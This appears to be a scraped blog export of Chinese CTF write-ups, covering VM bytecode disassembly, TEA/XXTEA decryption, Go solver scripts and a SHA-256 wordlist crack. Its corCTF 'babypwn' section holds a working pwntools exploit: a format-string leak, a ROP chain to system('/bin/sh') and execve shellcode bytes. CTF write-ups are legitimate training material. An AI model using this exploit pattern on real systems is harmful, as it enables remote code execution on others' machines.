0x00000002, 0x00000000, 0x00000010, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000010, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000005, 0x00000006, 0x00000000, 0x00000005, 0x00000007, 0x00000000, 0x00000005, 0x00000008, 0x00000000, 0x00000005, 0x00000009, 0x00000000, 0x00000005, 0x0000000A, 0x00000000, 0x00000005, 0x0000000B, 0x00000000, 0x00000005, 0x0000000C, 0x00000000, 0x00000005, 0x0000000D, 0x00000000, 0x00000005, 0x0000000E, 0x00000000, 0x00000005, 0x0000000F, 0x00000000, 0x00000005, 0x00000010, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x0000011C, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0xE8D1D5DF, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0xF5E3C114, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x00000127, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x228EC216, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x89D45A61, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x00000132, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x655B8F69, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x2484A07A, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x0000013D, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0xD9E5E7F8, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x3A441532, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x00000148, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x91AB7E88, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x69FC64BC, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x007D3765, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000189, 0x0000000C, 0x00000000, 0x00000000, 0x00000063, 0x00000000, 0x00000000, 0x00000001, 0x00000003, 0x9E3779B9, 0x00000001, 0x00000004, 0x00095C4C, 0x00000001, 0x00000005, 0x0000871D, 0x00000001, 0x00000006, 0x0001A7B7, 0x00000001, 0x00000007, 0x0012C7C7, 0x00000001, 0x00000008, 0x00000000, 0x00000001, 0x00000011, 0x00000010, 0x00000001, 0x00000012, 0x00000020, 0x00000001, 0x00000013, 0x00000160, 0x00000001, 0x0000000A, 0x00000000, 0x00000001, 0x0000000B, 0x00000020, 0x00000001, 0x0000000C, 0x00000001, 0x00000007, 0x00000008, 0x00000003, 0x00000002, 0x00000000, 0x00000002, 0x0000000A, 0x00000000, 0x00000011, 0x00000007, 0x00000000, 0x00000004, 0x00000002, 0x0000000E, 0x00000000, 0x00000002, 0x00000000, 0x00000002, 0x00000007, 0x00000000, 0x00000008, 0x00000002, 0x0000000F, 0x00000000, 0x00000002, 0x00000000, 0x00000002, 0x00000009, 0x00000000, 0x00000012, 0x00000007, 0x00000000, 0x00000005, 0x00000002, 0x00000010, 0x00000000, 0x00000002, 0x00000000, 0x0000000E, 0x0000000B, 0x00000000, 0x0000000F, 0x0000000B, 0x00000000, 0x00000010, 0x00000007, 0x00000001, 0x00000000, 0x00000002, 0x00000000, 0x00000001, 0x0000000A, 0x00000000, 0x00000011, 0x00000007, 0x00000000, 0x00000006, 0x00000002, 0x0000000E, 0x00000000, 0x00000002, 0x00000000, 0x00000001, 0x00000007, 0x00000000, 0x00000008, 0x00000002, 0x0000000F, 0x00000000, 0x00000002, 0x00000000, 0x00000001, 0x00000009, 0x00000000, 0x00000012, 0x00000007, 0x00000000, 0x00000007, 0x00000002, 0x00000010, 0x00000000, 0x00000002, 0x00000000, 0x0000000E, 0x0000000B, 0x00000000, 0x0000000F, 0x0000000B, 0x00000000, 0x00000010, 0x00000007, 0x00000002, 0x00000000, 0x00000008, 0x0000000B, 0x0000000C, 0x0000000E, 0x0000000B, 0x0000000A, 0x0000000C, 0x00000014, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006E, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006F, 0x00000062, 0x00000000, 0x00000000, 0x0000000C, 0x00000014, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000079, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000065, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000073, 0x00000062, 0x00000000, 0x00000000, 0x0000000C, 0x00000014, 0x00000000]print(len(opcodes)//3*3)op = 0arg1 = 0arg2 = 0arr = [0 for _ in range(20)]stack = [0 for _ in range(0x3e8)]i = 0while i &lt; len(opcodes): op = opcodes[i] arg1 = opcodes[i+1] arg2 = opcodes[i+2] match op: case 0: print(i, \"nop\") case 1: print(i, f\"arr[{arg1}]={arg2}\") case 2: print(i, f\"arr[{arg1}]=arr[{arg2}]\") case 3: print(i, f\"arr[{arg1}]=stack[{arg2}]\") case 4: print(i, f\"stack[{arg1}]=arr[{arg2}]\") case 5: print(i, f\"push arr[{(arg2&lt;&lt;8)+arg1}]\") case 6: print(i, f\"pop arr[{(arg2&lt;&lt;8)+arg1}]\") case 7: print(i, f\"arr[{arg1}]+=arr[{arg2}]\") case 8: print(i, f\"arr[{arg1}]-=arr[{arg2}]\") case 9: print(i, f\"arr[{arg1}]/=arr[{arg2}]\") case 10: print(i, f\"arr[{arg1}]*=arr[{arg2}]\") case 11: print(i, f\"arr[{arg1}]^=arr[{arg2}]\") case 12: print(i, f\"jmp 3*arr[{(arg2&lt;&lt;8)+arg1}]\") case 13: print(i, f\"if arr[{arg1}]==arr[{arg2}]:\\n jmp 3*arr[19]\") case 14: print(i, f\"if arr[{arg1}]!=arr[{arg2}]:\\n jmp 3*arr[19]\") case 15: print(i, f\"if arr[{arg1}]&gt;arr[{arg2}]:\\n jmp 3*arr[19]\") case 16: print(i, f\"if arr[{arg1}]&lt;arr[{arg2}]:\\n jmp 3*arr[19]\") case 0x61: print(i, f\"arr[{(arg2&lt;&lt;8)+arg1}]=getchar()\") case 0x62: print(i, f\"putchar(arr[{(arg2&lt;&lt;8)+arg1}])\") case 0x63: print(i, f\"quitVM!\") i += 3 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134140 nop3 nop6 arr[0]=879 putchar(arr[0])12 arr[0]=10115 putchar(arr[0])18 arr[0]=10821 putchar(arr[0])24 arr[0]=9927 putchar(arr[0])30 arr[0]=11133 putchar(arr[0])36 arr[0]=10939 putchar(arr[0])42 arr[0]=10145 putchar(arr[0])48 arr[0]=3251 putchar(arr[0])54 arr[0]=11657 putchar(arr[0])60 arr[0]=11163 putchar(arr[0])66 arr[0]=3269 putchar(arr[0])72 arr[0]=8675 putchar(arr[0])78 arr[0]=7881 putchar(arr[0])84 arr[0]=6787 putchar(arr[0])90 arr[0]=8493 putchar(arr[0])96 arr[0]=7099 putchar(arr[0])102 arr[0]=50105 putchar(arr[0])108 arr[0]=48111 putchar(arr[0])114 arr[0]=50117 putchar(arr[0])120 arr[0]=50123 putchar(arr[0])126 arr[0]=33129 putchar(arr[0])132 arr[0]=10135 putchar(arr[0])138 arr[0]=105141 putchar(arr[0])144 arr[0]=110147 putchar(arr[0])150 arr[0]=112153 putchar(arr[0])156 arr[0]=117159 putchar(arr[0])162 arr[0]=116165 putchar(arr[0])168 arr[0]=32171 putchar(arr[0])174 arr[0]=102177 putchar(arr[0])180 arr[0]=108183 putchar(arr[0])186 arr[0]=97189 putchar(arr[0])192 arr[0]=103195 putchar(arr[0])198 arr[0]=58201 putchar(arr[0])204 arr[0]=10207 putchar(arr[0])210 arr[19]=73213 arr[3]=0216 arr[1]=43219 arr[2]=1222 arr[0]=getchar()225 push arr[0]228 arr[1]-=arr[2]231 if arr[1]!=arr[3]: jmp 3*arr[19]234 arr[0]=0237 push arr[0]240 nop243 nop246 pop arr[0]249 arr[5]=256252 arr[0]*=arr[5]255 arr[6]=arr[0]258 pop arr[0]261 arr[6]+=arr[0]264 arr[0]=arr[6]267 arr[0]*=arr[5]270 arr[6]=arr[0]273 pop arr[0]276 arr[6]+=arr[0]279 arr[0]=arr[6]282 arr[0]*=arr[5]285 arr[6]=arr[0]288 pop arr[0]291 arr[6]+=arr[0]294 nop297 pop arr[0]300 arr[5]=256303 arr[0]*=arr[5]306 arr[7]=arr[0]309 pop arr[0]312 arr[7]+=arr[0]315 arr[0]=arr[7]318 arr[0]*=arr[5]321 arr[7]=arr[0]324 pop arr[0]327 arr[7]+=arr[0]330 arr[0]=arr[7]333 arr[0]*=arr[5]336 arr[7]=arr[0]339 pop arr[0]342 arr[7]+=arr[0]345 nop348 pop arr[0]351 arr[5]=256354 arr[0]*=arr[5]357 arr[8]=arr[0]360 pop arr[0]363 arr[8]+=arr[0]366 arr[0]=arr[8]369 arr[0]*=arr[5]372 arr[8]=arr[0]375 pop arr[0]378 arr[8]+=arr[0]381 arr[0]=arr[8]384 arr[0]*=arr[5]387 arr[8]=arr[0]390 pop arr[0]393 arr[8]+=arr[0]396 nop399 pop arr[0]402 arr[5]=256405 arr[0]*=arr[5]408 arr[9]=arr[0]411 pop arr[0]414 arr[9]+=arr[0]417 arr[0]=arr[9]420 arr[0]*=arr[5]423 arr[9]=arr[0]426 pop arr[0]429 arr[9]+=arr[0]432 arr[0]=arr[9]435 arr[0]*=arr[5]438 arr[9]=arr[0]441 pop arr[0]444 arr[9]+=arr[0]447 nop450 pop arr[0]453 arr[5]=256456 arr[0]*=arr[5]459 arr[10]=arr[0]462 pop arr[0]465 arr[10]+=arr[0]468 arr[0]=arr[10]471 arr[0]*=arr[5]474 arr[10]=arr[0]477 pop arr[0]480 arr[10]+=arr[0]483 arr[0]=arr[10]486 arr[0]*=arr[5]489 arr[10]=arr[0]492 pop arr[0]495 arr[10]+=arr[0]498 nop501 pop arr[0]504 arr[5]=256507 arr[0]*=arr[5]510 arr[11]=arr[0]513 pop arr[0]516 arr[11]+=arr[0]519 arr[0]=arr[11]522 arr[0]*=arr[5]525 arr[11]=arr[0]528 pop arr[0]531 arr[11]+=arr[0]534 arr[0]=arr[11]537 arr[0]*=arr[5]540 arr[11]=arr[0]543 pop arr[0]546 arr[11]+=arr[0]549 nop552 pop arr[0]555 arr[5]=256558 arr[0]*=arr[5]561 arr[12]=arr[0]564 pop arr[0]567 arr[12]+=arr[0]570 arr[0]=arr[12]573 arr[0]*=arr[5]576 arr[12]=arr[0]579 pop arr[0]582 arr[12]+=arr[0]585 arr[0]=arr[12]588 arr[0]*=arr[5]591 arr[12]=arr[0]594 pop arr[0]597 arr[12]+=arr[0]600 nop603 pop arr[0]606 arr[5]=256609 arr[0]*=arr[5]612 arr[13]=arr[0]615 pop arr[0]618 arr[13]+=arr[0]621 arr[0]=arr[13]624 arr[0]*=arr[5]627 arr[13]=arr[0]630 pop arr[0]633 arr[13]+=arr[0]636 arr[0]=arr[13]639 arr[0]*=arr[5]642 arr[13]=arr[0]645 pop arr[0]648 arr[13]+=arr[0]651 nop654 pop arr[0]657 arr[5]=256660 arr[0]*=arr[5]663 arr[14]=arr[0]666 pop arr[0]669 arr[14]+=arr[0]672 arr[0]=arr[14]675 arr[0]*=arr[5]678 arr[14]=arr[0]681 pop arr[0]684 arr[14]+=arr[0]687 arr[0]=arr[14]690 arr[0]*=arr[5]693 arr[14]=arr[0]696 pop arr[0]699 arr[14]+=arr[0]702 nop705 pop arr[0]708 arr[5]=256711 arr[0]*=arr[5]714 arr[15]=arr[0]717 pop arr[0]720 arr[15]+=arr[0]723 arr[0]=arr[15]726 arr[0]*=arr[5]729 arr[15]=arr[0]732 pop arr[0]735 arr[15]+=arr[0]738 arr[0]=arr[15]741 arr[0]*=arr[5]744 arr[15]=arr[0]747 pop arr[0]750 arr[15]+=arr[0]753 nop756 pop arr[0]759 arr[5]=256762 arr[0]*=arr[5]765 arr[16]=arr[0]768 pop arr[0]771 arr[16]+=arr[0]774 arr[0]=arr[16]777 arr[0]*=arr[5]780 arr[16]=arr[0]783 pop arr[0]786 arr[16]+=arr[0]789 arr[0]=arr[16]792 arr[0]*=arr[5]795 arr[16]=arr[0]798 pop arr[0]801 arr[16]+=arr[0]804 nop807 push arr[6]810 push arr[7]813 push arr[8]816 push arr[9]819 push arr[10]822 push arr[11]825 push arr[12]828 push arr[13]831 push arr[14]834 push arr[15]837 push arr[16]840 pop arr[1]843 pop arr[2]846 arr[20]=284849 arr[0]=340852 jmp 3*arr[0]855 arr[0]=3906065887858 arr[19]=387861 arr[20]=339864 if arr[1]!=arr[0]: jmp 3*arr[19]867 arr[0]=4125344020870 if arr[2]!=arr[0]: jmp 3*arr[19]873 pop arr[1]876 pop arr[2]879 arr[20]=295882 arr[0]=340885 jmp 3*arr[0]888 arr[0]=579781142891 arr[19]=387894 arr[20]=339897 if arr[1]!=arr[0]: jmp 3*arr[19]900 arr[0]=2312395361903 if arr[2]!=arr[0]: jmp 3*arr[19]906 pop arr[1]909 pop arr[2]912 arr[20]=306915 arr[0]=340918 jmp 3*arr[0]921 arr[0]=1700499305924 arr[19]=387927 arr[20]=339930 if arr[1]!=arr[0]: jmp 3*arr[19]933 arr[0]=612671610936 if arr[2]!=arr[0]: jmp 3*arr[19]939 pop arr[1]942 pop arr[2]945 arr[20]=317948 arr[0]=340951 jmp 3*arr[0]954 arr[0]=3655723000957 arr[19]=387960 arr[20]=339963 if arr[1]!=arr[0]: jmp 3*arr[19]966 arr[0]=977540402969 if arr[2]!=arr[0]: jmp 3*arr[19]972 pop arr[1]975 pop arr[2]978 arr[20]=328981 arr[0]=340984 jmp 3*arr[0]987 arr[0]=2443935368990 arr[19]=387993 arr[20]=339996 if arr[1]!=arr[0]: jmp 3*arr[19]999 arr[0]=17781485401002 if arr[2]!=arr[0]: jmp 3*arr[19]1005 pop arr[1]1008 arr[0]=82061811011 if arr[1]!=arr[0]: jmp 3*arr[19]1014 arr[0]=3931017 jmp 3*arr[0]1020 quitVM!1023 arr[3]=26544357691026 arr[4]=6134521029 arr[5]=345891032 arr[6]=1084711035 arr[7]=12307911038 arr[8]=01041 arr[17]=161044 arr[18]=321047 arr[19]=3521050 arr[10]=01053 arr[11]=321056 arr[12]=11059 arr[8]+=arr[3]1062 arr[0]=arr[2]1065 arr[0]*=arr[17]1068 arr[0]+=arr[4]1071 arr[14]=arr[0]1074 arr[0]=arr[2]1077 arr[0]+=arr[8]1080 arr[15]=arr[0]1083 arr[0]=arr[2]1086 arr[0]/=arr[18]1089 arr[0]+=arr[5]1092 arr[16]=arr[0]1095 arr[0]=arr[14]1098 arr[0]^=arr[15]1101 arr[0]^=arr[16]1104 arr[1]+=arr[0]1107 arr[0]=arr[1]1110 arr[0]*=arr[17]1113 arr[0]+=arr[6]1116 arr[14]=arr[0]1119 arr[0]=arr[1]1122 arr[0]+=arr[8]1125 arr[15]=arr[0]1128 arr[0]=arr[1]1131 arr[0]/=arr[18]1134 arr[0]+=arr[7]1137 arr[16]=arr[0]1140 arr[0]=arr[14]1143 arr[0]^=arr[15]1146 arr[0]^=arr[16]1149 arr[2]+=arr[0]1152 arr[11]-=arr[12]1155 if arr[11]!=arr[10]: jmp 3*arr[19]1158 jmp 3*arr[20]1161 nop1164 arr[0]=1101167 putchar(arr[0])1170 arr[0]=1111173 putchar(arr[0])1176 jmp 3*arr[20]1179 nop1182 arr[0]=1211185 putchar(arr[0])1188 arr[0]=1011191 putchar(arr[0])1194 arr[0]=1151197 putchar(arr[0])1200 jmp 3*arr[20] 程序很简单，循环输入，每四个Byte按照小端序转换成DWORD，前10个DWORD进行tea加密，然后对比一下结果就行了 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void decrypt(uint32_t *v, uint32_t *k){ uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i; uint32_t delta = 0x9e3779b9; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i &lt; 32; i++) { v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); sum -= delta; } v[0] = v0; v[1] = v1;}int main(){ uint32_t v[11] = {3906065887, 4125344020, 579781142, 2312395361, 1700499305, 612671610, 3655723000, 977540402, 2443935368, 1778148540, 8206181}, k[4] = {613452, 34589, 108471, 1230791}; for (int i = 0; i &lt; 10; i += 2) { decrypt(v + i, k); } for (int i = 0; i &lt; 11; i++) { for (int j = 0; j &lt; 4; j++) { printf(\"%c\", v[i] &gt;&gt; (j * 8) &amp; 0xff); } } return 0;} cm1android，动态加载dex，主要的代码逻辑都在动态加载的dex里，直接运行然后把生成的classes.dex拷贝出来 密文，密钥，加密方式都有，很明显是xxtea，写脚本直接解密 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x9e3779b9#define MX (((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))void btea(uint32_t *v, int n, uint32_t const key[4]){ uint32_t y, z, sum; unsigned p, rounds, e; rounds = 6 + 52 / n; sum = rounds * DELTA; y = v[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) { z = v[p - 1]; y = v[p] -= MX; } z = v[n - 1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds);}int main(){ uint32_t v[11] = {1822697284, 3377000110, 187091018, 3630257212, 2925741911, 3106891896, 553699270, 3654559274, 1560179140, 850622133, 2518690695}; uint32_t const k[4] = {1349530696, 1314283353, 558257219, 1333153569}; int n = 11; btea(v, n, k); for (int i = 0; i &lt; 11; i++) { for (int j = 0; j &lt; 4; j++) { printf(\"%c\", v[i] &gt;&gt; (j * 8) &amp; 0xff); } } return 0;}","link":"/2022/02/18/VNCTF-2022-wp/"},{"title":"L3HCTF re double-joy 题解","text":"备份的时候出了问题内容不见了，所以见先知","link":"/2021/11/25/L3HCTF-re-double-joy-%E9%A2%98%E8%A7%A3/"},{"title":"corctf2022_wp","text":"比赛质量很高，可惜只做了一天，第二天有事出去了一天，再做题的时候发现已经结束了，后面的题目复现的时候慢慢加上。 reMicrosoft ❤️ Linux这题比较简单但是很有意思。 先用IDA打开，发现是一个32位的ELF文件，做了一个循环左移，但是对一个8bit数左移13位很奇怪 123456789101112131415161718192021void __noreturn start(){ int i; // esi int v1; // eax int v2; // eax int v3; // eax __asm { int 80h; LINUX - } for ( i = 0; i != 18; LOWORD(i) = i + 1 ) { if ( __ROL1__(byte_100111[i], 13) != byte_100210[i] ) goto LABEL_6; } word_100234 = 1;LABEL_6: if ( word_100234 == 1 ) v2 = sys_write(1, &amp;off_1002AE, 0x62u); else v1 = sys_write(1, &amp;off_100310, 0xDu); v3 = sys_exit(0);} 解出来只有一半的flag，按照提示尝试windows下不能直接运行，有可能是DOS，用ghidra打开，调成16bit解析，发现是异或 1234567890000:00d6 83 fe 12 CMP SI,0x120000:00d9 74 11 JZ LAB_0000_00ec0000:00db 8a 84 13 02 MOV AL,byte ptr [SI + 0x213 ]0000:00df 34 0d XOR AL,0xd0000:00e1 8a 9c 22 03 MOV BL,byte ptr [SI + 0x322 ]0000:00e5 38 d8 CMP AL,BL0000:00e7 75 09 JNZ LAB_0000_00f20000:00e9 46 INC SI0000:00ea eb ea JMP LAB_0000_00d6 正好异或的是13，和前面对应 12345678910111213141516171819202122package mainimport \"fmt\"func main() { s := []byte{ 0x6c, 0xed, 0x4e, 0x6c, 0x8e, 0xcc, 0x6f, 0x66, 0xad, 0x4c, 0x4e, 0x86, 0x6c, 0x66, 0x85, 0x66, 0x0f, 0x8e, 0x3e, 0x63, 0x69, 0x21, 0x3e, 0x55, 0x79, 0x3c, 0x63, 0x6a, 0x78, 0x3c, 0x38, 0x65, 0x2c, 0x2c, 0x3c, 0x70, } for i, c := range s { if i &lt; 18 { low := c &gt;&gt; 5 &amp; 0xff high := c &lt;&lt; 3 &amp; 0xff fmt.Printf(\"%c\", low|high) } else { fmt.Printf(\"%c\", c^0xd) } } //fmt.Println(s)} turbocrabrust题，用Iced_x86跑了一段代码，前面的部分都可以直接调试过去，直接找到执行的部分，仅仅是进行了一些简单的操作，唯一的问题在于存在多解的可能，要慢慢调整 1234567891011121314151617181920212223242526272829package mainimport \"fmt\"func main() { s := \"R^CRIWJM&lt;6.[5I.G`.C3G3CB5_V?P0\" alphabet := \"{}_!.,-=+;':\\\"&lt;&gt;/?0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\" for _, c := range s { for _, ch := range alphabet { var tmpRes byte var tmpCh = byte(ch) if tmpCh &lt;= 0x80 { tmpCh = (tmpCh ^ 0x13) - 30 } else { tmpCh = (tmpCh ^ 0x24) - 30 } if tmpCh &lt;= 16 { tmpRes = tmpCh ^ 0x31 } else { tmpRes = tmpCh } if tmpRes == byte(c) { fmt.Printf(\"%c\", ch) break } } }} hackermans dungeon这题赛后复现的，比赛的时候都逆完了但是没什么解决思路，赛后发现就是crack一个sha256的hash 12345678910111213if ( (int)v17 &gt; 0 ){ v18 = 0i64; do { ++passwd[v18]; v19 = v5 % (int)v17; ++v5; passwd[v18] = ~((passwd[v19] ^ passwd[v18]) + 98); ++v18; } while ( v18 &lt; (int)v17 );} 首先对输入有一个编码，然后就是一通md5,sha256,chacha20,crc32的操作，在这里卡了很久因为根本求解不出来，赛后看到直接对sha256跑一个字典，非常常用的rockyou.txt就可以了，试了一下，直接就可以解出来。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package mainimport ( \"bufio\" \"crypto/sha256\" \"encoding/hex\" \"fmt\" \"io\" \"os\" \"strings\")func Sha256(src string) string { m := sha256.New() m.Write([]byte(src)) res := hex.EncodeToString(m.Sum(nil)) return res}func handle(s []byte) []byte { for i := 0; i &lt; len(s); i++ { tmpI := (i + 1) % len(s) s[i] = ^(((s[i] + 1) ^ s[tmpI]) + 98) } return s}func main() { wordlist, err := os.Open(\"rockyou.txt\") shaRes := strings.ToLower(\"9C00F1AC636216E2342F64AE3B82E3C02749A69C35DF8C03554D55C101869D47\") //fmt.Println(sha_res) if err != nil { return } fp := bufio.NewReader(wordlist) for { b, _, err := fp.ReadLine() if err == io.EOF { break } backup := string(b) s := handle(b) //for _, c := range s { // fmt.Printf(\"%02x \", c) //} res := Sha256(string(s)) if res == shaRes { fmt.Println(backup) break } //break }} pwnbabypwn格式化字符串加栈溢出，泄露libc_base然后构造rop 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!/usr/bin/env python3# %%from pwn import *from LibcSearcher import *binary = ELF(\"./babypwn_patched\")libc = ELF(\"./libc.so.6\")ld = ELF(\"./ld-2.31.so\")context.binary = binarycontext.os = 'linux'context.arch = context.binary.arch# context.terminal = ['alacritty', '-e']context.terminal = ['wt.exe', 'wsl', '--']local = Falseif local: context.log_level = 'debug' p = process([binary.path])else: p = remote(\"be.ax\", 31801)def dbgaddr(addr, PIE=False): # PIE enabled if local: if PIE: text_base = int( os.popen(\"pmap {}| awk '{{print $1}}'\".format(p.pid)).readlines()[1], 16) log.info(f'b *{hex(text_base + addr)}\\n') gdb.attach(p, f'b *{hex(text_base + addr)}') else: gdb.attach(p, f'b *{hex(addr)}')def dbg(func=''): if local: gdb.attach(p, func)# dbgaddr(0x6AA1,PIE=True)# dbg(\"main\")s = lambda str: p.send(str)sl = lambda str: p.sendline(str)sa = lambda delims, str: p.sendafter(delims, str)sla = lambda delims, str: p.sendlineafter(delims, str)r = lambda numb=4096: p.recv(numb)rl = lambda: p.recvline()ru = lambda delims, drop=True: p.recvuntil(delims, drop)uu32 = lambda data: u32(data.ljust(4, b'\\x00'))uu64 = lambda data: u64(data.ljust(8, b'\\x00'))li = lambda str, data: log.success(str + '========&gt;' + hex(data))# %%sh_x86_18 = b\"\\x6a\\x0b\\x58\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\"sh_x86_20 = b\"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\"sh_x64_21 = b\"\\xf7\\xe6\\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05\"# https://www.exploit-db.com/shellcodes# %%ru(b\"?\\n\")sl(b\"%2$p.%9$p\")ru(b\"Hi, \")tmp=rl()[:-1].split(b\".\")libcbase=int(tmp[0][2:],16)+5184li(\"libcbase\",libcbase)binbase=int(tmp[1][2:],16)-106942li(\"binbase\",binbase)# %%system=libcbase+libc.sym.systemli(\"system\",system)bin_sh=libcbase+libc.search(b\"/bin/sh\").__next__()li(\"bin_sh\",bin_sh)pop_rdi=binbase+0x00000000000051d1li(\"pop_rdi\",pop_rdi)# pop_rdi=libcbase+0x0000000000023b6apayload=b\"a\"*0x60+p64(binbase+0x0000000000015631)+p64(pop_rdi)+p64(bin_sh)+p64(system)sl(payload)# %%p.interactive() 这里做麻烦了一些，可以使用libc里的gadgets，就可以不用泄露binary base。","link":"/2022/08/09/corctf2022-wp/"},{"title":"hws-2023","text":"没有时间参加线下的夏令营，所以没花太多时间，只是简单做了几道题 reAnimals输入9个数字，有6个选项，选中的选项就把对应的字符串拼接到后面，然后算一个魔改的md5，最主要的改动就是替换了这4个值 123456789void md5_starts(md5_context *ctx) { ctx-&gt;total[0] = 0; ctx-&gt;total[1] = 0; ctx-&gt;state[0] = 0xEFCDAB89; ctx-&gt;state[1] = 0x67452301; ctx-&gt;state[2] = 0x10325476; ctx-&gt;state[3] = 0x98BADCFE;} 总共也就只有6^9种可能，直接爆破得到输入051410233，算md5即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;strings.h&gt;unsigned char res[18] = { 0xDD, 0xB2, 0x6D, 0xF3, 0xE6, 0x0A, 0xC7, 0x83, 0x4A, 0x93, 0x50, 0xB4, 0xA4, 0x59, 0xAB, 0x0E,};typedef struct { unsigned long total[2]; /*!&lt; number of bytes processed */ unsigned long state[4]; /*!&lt; intermediate digest state */ unsigned char buffer[64]; /*!&lt; data block being processed */} md5_context;#ifdef __cplusplusextern \"C\" {#endif/** * \\brief MD5 context setup * * \\param ctx context to be initialized */void md5_starts(md5_context *ctx);/** * \\brief MD5 process buffer * * \\param ctx MD5 context * \\param input buffer holding the data * \\param ilen length of the input data */void md5_update(md5_context *ctx, const unsigned char *input, int ilen);/** * \\brief MD5 final digest * * \\param ctx MD5 context * \\param output MD5 checksum result */void md5_finish(md5_context *ctx, unsigned char output[16]);/** * \\brief Output = MD5( input buffer ) * * \\param input buffer holding the 